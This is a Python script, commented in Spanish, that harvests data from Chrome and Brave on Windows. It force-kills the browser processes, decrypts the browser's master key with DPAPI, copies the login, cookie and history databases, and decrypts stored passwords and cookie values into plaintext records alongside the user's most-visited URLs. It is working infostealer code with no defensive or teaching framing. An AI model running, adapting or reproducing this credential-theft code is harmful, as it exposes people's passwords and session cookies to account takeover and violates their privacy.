import os
import json
import base64
import win32crypt
import shutil
import sqlite3
from datetime import datetime
from Crypto.Cipher import AES
import psutil

def convert_date(i_time):
    if int(i_time) == 0:
        utc = datetime.utcfromtimestamp(0)
    else:
        fname = 116444736000000000
        nseconds = 10000000
        #
        utc = datetime.utcfromtimestamp(((10 * int(i_time)) - fname) / nseconds)
        #
    return utc.strftime('%Y-%m-%d %H:%M:%S')

def decript_data(data, key):
    try:
        # vector de inicializazcion para el cifrado
        iv = data[3:15]
        data = data[15:]
        # genero el cifrado con la llave
        cifrado = AES.new(key, AES.MODE_GCM, iv)
        # desencripto contrasenia
        return cifrado.decrypt(data)[:-16].decode()
    except:
        try:
            #si falla intento desencriptarla con win32crypt
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # no se pudo desencriptar, puede que haya estado vacio el campo, se retorna vacio
            return ""

def get_data(navegador: list):
    #matar procesos
    for proc in psutil.process_iter(['pid','name']):
        if proc.info['name'] == 'chrome.exe':
            proc.kill()
        if proc.info['name'] == 'brave.exe':
            proc.kill()


    #directorio de trabajo
    work_dir = os.path.expanduser('~')+f'/AppData/Local/{navegador[0]}/{navegador[1]}/User Data'
    
    #llave de encriptacion
    patch_key = os.path.join(work_dir, "Local State")

    #abro el archivo y luego lo cierro
    file_key = open(patch_key, "r", encoding="utf-8")
    file_key_read = file_key.read()
    file_key.close()
    json_key = json.loads(file_key_read)

    #desencripto la llave
    key = win32crypt.CryptUnprotectData(base64.b64decode(json_key["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]

    #traigo archivo de logins
    file_passwords = os.path.join(work_dir, "Default", "Login Data")
    # copio el archivo de base de datos para no tener errores
    shutil.copyfile(file_passwords, f"dataLogin{navegador[1]}")

    database  = sqlite3.connect(f"dataLogin{navegador[1]}")
    consultas = database.cursor()

    contras = []

    consultas.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    for row in consultas.fetchall():
        contras.append({
            "url":row[0],
            "user":row[1],
            "password":decript_data(row[2],key),
            "created": convert_date(row[3]),
            "used": convert_date(row[4]),
        })

    consultas.close()
    database.close()

    #COOKIES
    #traigo archivo de cookies
    file_cookies = os.path.join(work_dir, "Default", "Network", "Cookies")

    try:
        #intento copiar el archivo
        shutil.copyfile(file_cookies, f"dataCookies{navegador[1]}")
    except:
        pass    

    database = sqlite3.connect(f"dataCookies{navegador[1]}")
    consultas = database.cursor()

    cookies = []

    consultas.execute("SELECT host_key, name, value, creation_utc, encrypted_value FROM cookies")

    for row in consultas.fetchall():
        cookies.append({
           "url":row[0],
           "clave":row[1],
           "creacion":convert_date(row[3]),
           "valor": row[2] if row[2] else decript_data(row[4], key)
        })

    consultas.close()
    database.close()

    #HISTORIAL
    #traigo archivo de cookies
    file_cookies = os.path.join(work_dir,  "Default", "History")

    try:
        #intento copiar el archivo
        shutil.copyfile(file_cookies, f"dataHistory{navegador[1]}")
    except:
        pass

    database = sqlite3.connect(f"dataHistory{navegador[1]}")
    consultas = database.cursor()

    historial = []

    consultas.execute("SELECT url, SUM(visit_count) conteo FROM urls GROUP BY url ORDER BY SUM(visit_count) DESC LIMIT 10")

    for row in consultas.fetchall():
        historial.append({
           "url":row[0],
           "conteo":row[1]
        })

    consultas.close()
    database.close()

    return {"cookies":cookies, "contras":contras, "historial":historial}